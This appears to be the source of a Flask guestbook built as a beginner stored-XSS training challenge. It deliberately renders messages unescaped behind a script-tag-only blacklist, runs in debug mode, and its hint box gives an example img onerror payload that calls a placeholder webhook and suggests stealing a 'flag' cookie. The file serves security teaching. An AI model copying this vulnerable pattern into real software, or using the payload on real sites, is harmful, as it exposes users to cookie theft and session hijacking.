from flask import Flask, request, render_template_string, make_response, redirect, url_for
import re
from html import escape

app = Flask(__name__)

# In-memory storage (resets on restart - perfect for demo)
comments = []

# Simple blacklist filter: block <script> tags (case-insensitive)
def sanitize(input_str):
    if not input_str:
        return ""
    # Remove <script>...</script> tags (including nested attempts)
    cleaned = re.sub(r'(?i)<\s*script[^>]*>.*?<\s*/\s*script\s*>', '', input_str, flags=re.DOTALL)
    # Also remove standalone <script ...>
    cleaned = re.sub(r'(?i)<\s*script[^>]*>', '', cleaned)
    return cleaned

INDEX_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Guestbook - Stored XSS Challenge</title>
    <style>
        * { box-sizing: border-box; }
        body {
            font-family: system-ui, -apple-system, sans-serif;
            max-width: 700px;
            margin: 40px auto;
            padding: 0 20px;
            background: #0f172a;
            color: #e2e8f0;
            line-height: 1.5;
        }
        h1 { color: #38bdf8; margin-bottom: 8px; }
        .subtitle { color: #94a3b8; margin-bottom: 30px; }
        .card {
            background: #1e293b;
            border-radius: 12px;
            padding: 24px;
            margin-bottom: 24px;
            border: 1px solid #334155;
        }
        label { display: block; margin-bottom: 6px; font-weight: 500; color: #cbd5e1; }
        input, textarea {
            width: 100%;
            padding: 10px 12px;
            border-radius: 8px;
            border: 1px solid #475569;
            background: #0f172a;
            color: #e2e8f0;
            font-size: 15px;
            margin-bottom: 16px;
        }
        input:focus, textarea:focus {
            outline: none;
            border-color: #38bdf8;
            box-shadow: 0 0 0 3px rgba(56, 189, 248, 0.2);
        }
        button {
            background: #38bdf8;
            color: #0f172a;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            transition: background 0.2s;
        }
        button:hover { background: #7dd3fc; }
        .comment {
            background: #1e293b;
            border-left: 4px solid #38bdf8;
            padding: 16px 20px;
            margin-bottom: 16px;
            border-radius: 0 8px 8px 0;
        }
        .comment .author {
            font-weight: 600;
            color: #38bdf8;
            margin-bottom: 6px;
        }
        .comment .message {
            color: #e2e8f0;
            word-break: break-word;
        }
        .hint {
            background: #422006;
            border: 1px solid #b45309;
            color: #fcd34d;
            padding: 16px;
            border-radius: 8px;
            margin-bottom: 24px;
            font-size: 14px;
        }
        .hint strong { color: #fbbf24; }
        a { color: #38bdf8; }
        .success { color: #4ade80; margin-bottom: 16px; }
        footer {
            text-align: center;
            color: #64748b;
            font-size: 13px;
            margin-top: 40px;
        }
    </style>
</head>
<body>
    <h1>📝 Guestbook</h1>
    <p class="subtitle">Leave a message for everyone to see!</p>

    <div class="hint">
        <strong>🎯 Challenge (Beginner Stored XSS)</strong><br><br>
        The server blocks <code>&lt;script&gt;</code> tags.<br>
        Your goal: Make a request to your <a href="https://webhook.site" target="_blank">webhook.site</a> URL when someone views the guestbook.<br><br>
        <strong>Hint:</strong> Try using an <code>&lt;img&gt;</code> tag with an <code>onerror</code> event.<br>
        Example payload idea: <code>&lt;img src=x onerror="fetch('YOUR_WEBHOOK_URL')"&gt;</code><br><br>
        Bonus: Steal the secret cookie named <code>flag</code> and send it to your webhook!
    </div>

    {% if success %}
    <p class="success">✅ Comment posted successfully!</p>
    {% endif %}

    <div class="card">
        <form method="POST" action="/">
            <label for="name">Your Name</label>
            <input type="text" id="name" name="name" placeholder="Anonymous" maxlength="50" required>

            <label for="message">Message</label>
            <textarea id="message" name="message" rows="4" placeholder="Write something nice..." maxlength="500" required></textarea>

            <button type="submit">Post Comment</button>
        </form>
    </div>

    <h2 style="margin-bottom: 16px; color: #94a3b8;">Comments ({{ comments|length }})</h2>

    {% if comments %}
        {% for c in comments %}
        <div class="comment">
            <div class="author">{{ c.name }}</div>
            <div class="message">{{ c.message | safe }}</div>
        </div>
        {% endfor %}
    {% else %}
        <p style="color: #64748b;">No comments yet. Be the first!</p>
    {% endif %}

    <footer>
        Educational XSS Challenge • Deployed on Render<br>
        <a href="/reset">Reset all comments</a>
    </footer>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    success = False
    if request.method == "POST":
        name = request.form.get("name", "Anonymous").strip()[:50]
        message = request.form.get("message", "").strip()[:500]

        # Apply the weak filter (blocks script tags only)
        name = sanitize(name)
        message = sanitize(message)

        # Escape name for safety, but leave message vulnerable (intentional)
        name = escape(name)

        if name and message:
            comments.insert(0, {"name": name, "message": message})
            success = True

    # Set a secret cookie for the bonus challenge
    resp = make_response(render_template_string(INDEX_HTML, comments=comments, success=success))
    resp.set_cookie("flag", "XSS_STORED_BEGINNER_2024", httponly=False, samesite="Lax")
    return resp

@app.route("/reset")
def reset():
    comments.clear()
    return redirect(url_for("index"))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
